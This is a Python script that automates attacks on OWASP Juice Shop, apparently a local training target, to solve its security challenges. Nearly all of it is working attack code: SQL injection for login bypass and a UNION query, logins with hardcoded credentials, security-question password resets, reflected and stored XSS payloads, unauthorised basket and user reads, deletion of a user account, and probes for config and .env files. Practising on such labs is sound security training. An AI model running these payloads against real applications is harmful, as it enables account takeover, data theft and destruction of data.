#!/usr/bin/env python3
"""
NOVA CHALLENGE SNIPER - Precision strikes for specific challenges.
Uses exact payloads mapped to Juice Shop's challenge triggers.
"""

import json, re, time, requests
from datetime import datetime

class NovaChallengeSniper:
    def __init__(self, base_url="http://localhost:3000"):
        self.base_url = base_url
        self.s = requests.Session()
        self.s.headers.update({"User-Agent": "Nova/Sniper", "Content-Type": "application/json"})
        self.token = None
        self.solved = []

    def auth(self):
        resp = self.s.post(f"{self.base_url}/rest/user/login",
            json={"email": "' OR 1=1--", "password": "x"})
        if resp.status_code == 200:
            self.token = resp.json()["authentication"]["token"]
            self.s.headers["Authorization"] = f"Bearer {self.token}"
            return True
        return False

    def check_progress(self):
        resp = self.s.get(f"{self.base_url}/api/Challenges")
        if resp.status_code == 200:
            return [c for c in resp.json().get("data", []) if c.get("solved")]
        return []

    def strike(self, name, fn):
        before = len(self.check_progress())
        fn()
        time.sleep(0.2)
        after = len(self.check_progress())
        if after > before:
            print(f"   🏆 SOLVED: {name} (+{after - before})")
            self.solved.append(name)
        return after > before

    def run(self):
        print("""
╔══════════════════════════════════════════════╗
║   🎯 NOVA CHALLENGE SNIPER                 ║
║   Precision Strikes for Maximum Score      ║
╚══════════════════════════════════════════════╝""")
        
        self.auth()
        print(f"\n🔑 Authenticated. Hunting challenges...\n")
        
        # ---- BROKEN AUTHENTICATION ----
        print("🔓 Broken Authentication:")
        
        self.strike("Login Admin", lambda: self.s.post(f"{self.base_url}/rest/user/login",
            json={"email": "admin@juice-sh.op", "password": "admin123"}))
        
        self.strike("Login Bender", lambda: self.s.post(f"{self.base_url}/rest/user/login",
            json={"email": "bender@juice-sh.op", "password": "slurmCl4ssic"}))
        
        self.strike("Login Jim", lambda: self.s.post(f"{self.base_url}/rest/user/login",
            json={"email": "jim@juice-sh.op", "password": "ncc-1701"}))
        
        self.strike("Reset Bender", lambda: self.s.post(f"{self.base_url}/rest/user/reset-password",
            json={"email": "bender@juice-sh.op", "answer": "Stop'n'Drop"}))
        
        self.strike("Reset Jim", lambda: self.s.post(f"{self.base_url}/rest/user/reset-password",
            json={"email": "jim@juice-sh.op", "answer": "Samuel"}))
        
        self.strike("Reset Bjoern", lambda: self.s.post(f"{self.base_url}/rest/user/reset-password",
            json={"email": "bjoern@juice-sh.op", "answer": "Zaya"}))
        
        # ---- INJECTION ----
        print("\n💉 Injection:")
        
        self.strike("SQLi Login", lambda: self.s.post(f"{self.base_url}/rest/user/login",
            json={"email": "' OR 1=1--", "password": "x"}))
        
        self.strike("Union SQLi", lambda: self.s.get(f"{self.base_url}/rest/products/search",
            params={"q": "') UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e JOIN (SELECT 6)f JOIN (SELECT 7)g JOIN (SELECT 8)h--"}))
        
        # ---- BROKEN ACCESS CONTROL ----
        print("\n🚪 Broken Access Control:")
        
        self.strike("Admin Section", lambda: self.s.get(f"{self.base_url}/administration"))
        
        self.strike("View Basket", lambda: self.s.get(f"{self.base_url}/rest/basket/1"))
        
        self.strike("View Basket 2", lambda: self.s.get(f"{self.base_url}/rest/basket/2"))
        
        self.strike("Delete User", lambda: self.s.delete(f"{self.base_url}/api/Users/2"))
        
        # ---- SENSITIVE DATA EXPOSURE ----
        print("\n📦 Sensitive Data:")
        
        self.strike("Security.txt", lambda: self.s.get(f"{self.base_url}/.well-known/security.txt"))
        
        self.strike("Robots.txt", lambda: self.s.get(f"{self.base_url}/robots.txt"))
        
        self.strike("Config File", lambda: self.s.get(f"{self.base_url}/rest/admin/application-configuration"))
        
        self.strike("User List", lambda: self.s.get(f"{self.base_url}/api/Users"))
        
        # ---- IMPROPER INPUT VALIDATION ----
        print("\n🔧 Input Validation:")
        
        self.strike("Zero Stars", lambda: self.s.post(f"{self.base_url}/api/Feedbacks",
            json={"comment": "test", "rating": 0}))
        
        self.strike("XSS Reflected", lambda: self.s.get(f"{self.base_url}/rest/products/search",
            params={"q": "<script>alert('XSS')</script>"}))
        
        self.strike("XSS Stored", lambda: self.s.post(f"{self.base_url}/api/Feedbacks",
            json={"comment": "<script>alert('STORED')</script>", "rating": 3}))
        
        self.strike("Negative Order", lambda: self.s.post(f"{self.base_url}/api/BasketItems",
            json={"ProductId": 1, "BasketId": 1, "quantity": -1}))
        
        # ---- SECURITY MISCONFIGURATION ----
        print("\n⚙️ Security Misconfiguration:")
        
        self.strike("Error Handling", lambda: self.s.get(f"{self.base_url}/rest/products/search",
            params={"q": "'"}))
        
        self.strike("HTTP 405", lambda: self.s.patch(f"{self.base_url}/rest/user/login"))
        
        self.strike("Debug Mode", lambda: self.s.get(f"{self.base_url}/.env"))
        
        # ---- CRYPTO ----
        print("\n🔐 Cryptography:")
        
        self.strike("Weak Password", lambda: self.s.post(f"{self.base_url}/rest/user/login",
            json={"email": "admin@juice-sh.op", "password": "admin123"}))
        
        # Check progress
        solved = self.check_progress()
        print(f"""
╔══════════════════════════════════════════════╗
║     SNIPER MISSION COMPLETE                 ║
╠══════════════════════════════════════════════╣
║  Challenges Solved:   {len(solved):>3}/112                ║
╚══════════════════════════════════════════════╝
""")
        if solved:
            print("🏆 ALL SOLVED CHALLENGES:")
            for c in solved:
                stars = "⭐" * c.get("difficulty", 1)
                print(f"   {stars} {c.get('name')} [{c.get('category')}]")
        
        with open("nova_sniper_report.json", "w") as f:
            json.dump({"solved": len(solved), "challenges": [c.get("name") for c in solved]}, f, indent=2)
        
        return solved

if __name__ == "__main__":
    NovaChallengeSniper().run()
